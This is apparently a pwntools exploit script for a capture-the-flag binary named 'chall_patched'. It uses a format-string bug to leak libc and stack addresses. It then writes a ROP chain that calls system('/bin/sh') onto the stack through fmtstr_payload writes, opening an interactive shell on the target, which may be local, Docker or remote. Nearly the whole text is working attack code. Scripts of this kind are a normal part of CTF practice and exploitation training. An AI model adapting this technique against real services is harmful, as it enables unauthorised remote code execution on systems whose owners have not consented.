#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x1374
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.sendlineafter(b":", b"%27$p.%28$p")
    io.recvuntil(b" ")
    leaks = io.recvline().split(b".")
    libc.address = int(leaks[0], 16) - 0x2a1ca
    stack = int(leaks[1], 16) - 0x58

    info("libc base: %#x", libc.address)
    info("stack: %#x", stack)

    rop = ROP("libc.so.6")
    pop_rdi = libc.address + rop.find_gadget(["pop rdi", "ret"])[0]
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    offset = 6
    gadget = [
        pop_rdi,
        sh,
        pop_rdi+1,
        system
    ]

    for i in range(0, len(gadget), 2):
        write = {
            stack + (i * 8): gadget[i],
            stack + (i * 8 + 8): gadget[i+1]
        }

        payload = fmtstr_payload(offset, write, write_size='short')
        io.sendline(payload)


    io.clean()
    io.sendline(b"exit")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

